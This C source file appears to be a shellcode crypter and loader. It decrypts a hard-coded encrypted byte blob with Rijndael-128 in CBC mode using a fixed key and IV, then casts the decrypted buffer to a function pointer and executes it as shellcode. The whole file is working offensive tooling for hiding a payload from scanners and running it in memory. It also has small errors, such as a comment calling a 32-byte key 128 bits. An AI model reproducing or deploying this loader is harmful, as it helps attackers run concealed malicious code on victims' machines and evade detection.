#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * MCrypt API available online:
 * http://linux.die.net/man/3/mcrypt
 */
#include <mcrypt.h>

#include <math.h>
#include <stdint.h>
#include <stdlib.h>

int encrypt(
    void* buffer,
    int buffer_len, /* Because the plaintext could include null bytes*/
    char* IV, 
    char* key,
    int key_len 
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}

  mcrypt_generic_init(td, key, key_len, IV);
  mcrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);
  
  return 0;
}

int decrypt(
    void* buffer,
    int buffer_len,
    char* IV, 
    char* key,
    int key_len 
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}
  
  mcrypt_generic_init(td, key, key_len, IV);
  mdecrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);
  
  return 0;
}

void display(char* ciphertext, int len){
  int v;
  for (v=0; v<len; v++){
    printf("\\x%x", ciphertext[v]);
  }
  printf("\n");
}

int main()
{
  MCRYPT td, td2;
  char * plaintext = "\x27\x02\xb8\x1b\xcc\x83\x26\x55\xec\xbb\x06\x82\x33\xbc\x22\xcf\xaa\x35\xab\xd4\xcf\xb0\xed\x5c\x0a\x11\x30\x32\xe6\xeb\x71\x1f";
  char* IV = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  char *key = "0123456789abcdef0123456789abcdef";
  int keysize = 32; /* 128 bits */
  char* buffer;
  int buffer_len = 32;

  buffer = calloc(1, buffer_len);
  strncpy(buffer, plaintext, buffer_len);

  printf("==C==\n");
  //printf("plain:   %s\n", plaintext);
  //encrypt(buffer, buffer_len, IV, key, keysize); 
  printf("cipher:  "); display(buffer , buffer_len);
  decrypt(buffer, buffer_len, IV, key, keysize);
  printf("decrypt: %s\n", buffer);
  
  //jump into SC
  printf("Shellcode Length:  %d\n", strlen(buffer));
  int (*ret)() = (int(*)())buffer;
  ret();

  return 0;
}
